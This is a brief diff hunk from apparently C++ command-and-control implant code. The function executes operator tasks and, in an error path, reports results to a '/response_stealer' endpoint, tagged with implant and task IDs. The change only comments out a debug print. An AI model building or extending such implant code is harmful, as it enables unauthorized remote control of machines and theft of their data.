@@ -118,7 +118,7 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
         }
          catch(...){
             try{
-                printf("IN 2nd try block :((((( \n");
+                //printf("IN 2nd try block :((((( \n");
                 HttpResponse("/response_stealer", implant_id, task_id, results, "failure", command);
             }
             catch(...){
